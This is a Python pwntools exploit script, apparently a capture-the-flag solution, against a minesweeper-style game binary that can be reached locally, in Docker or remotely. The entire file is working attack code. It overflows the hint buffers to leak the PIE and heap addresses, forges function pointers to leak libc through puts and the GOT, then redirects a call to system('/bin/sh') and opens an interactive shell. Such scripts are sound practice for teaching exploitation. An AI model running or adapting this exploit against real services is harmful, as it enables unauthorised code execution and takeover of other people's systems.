#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('app_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], ssl=True, sni=True, *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x1A84
brva 0x1C27
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def init_board():
    io.sendlineafter(b">", b"1")

def place_mine(x, y):
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b">", str(x).encode())
    io.sendlineafter(b">", str(y).encode())

def edit_hint(x, y, data):
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b">", str(x).encode())
    io.sendlineafter(b">", str(y).encode())
    io.sendafter(b":", data)

def reveal_cell(x, y):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b">", str(x).encode())
    io.sendafter(b">", str(y).encode())
    io.recvuntil(b"hint: ")
    data = io.recvline()
    return data[:-1]

def parse_libc(x, y):
    io.sendlineafter(b">", b"4")
    io.sendlineafter(b">", str(x).encode())
    io.sendafter(b">", str(y).encode())
    io.recvuntil(b"...\n")
    data = io.recv(6)
    return data
    

def solve():

    init_board()

    """
    Get pie/heap leak from coord (0,0)
    """
    edit_hint(0, 0, b"A"*0x40)
    leak = reveal_cell(0, 0)[0x40:]
    exe.address = u64(leak.ljust(8, b"\x00")) - exe.sym["_Z11cell_revealPc"]
    info("elf base: %#x", exe.address) 

    edit_hint(0, 0, b"A"*0x48)
    leak = reveal_cell(0, 0)[0x48:]
    heap_base = u64(leak.ljust(8, b"\x00")) - 0x128a0
    info("heap base: %#x", heap_base) 

    """
    Fake function pointers for libc leak
    """

    edit_hint(0, 1, b"A"*0x40 + p64(exe.plt["puts"]))
    edit_hint(0, 0, b"A"*0x48 + p64(heap_base + 0x128e8))
    edit_hint(0, 1, p64(exe.got["puts"]))
    leak = parse_libc(0, 2)
    libc.address = u64(leak.ljust(8, b"\x00")) - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    """
    Get shell!!
    """

    edit_hint(0, 3, b"A"*0x40 + p64(libc.sym["system"]))
    edit_hint(0, 4, b"/bin/sh\x00")

    io.sendlineafter(b">", b"4")
    io.sendlineafter(b">", str(0).encode())
    io.sendafter(b">", str(4).encode())

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

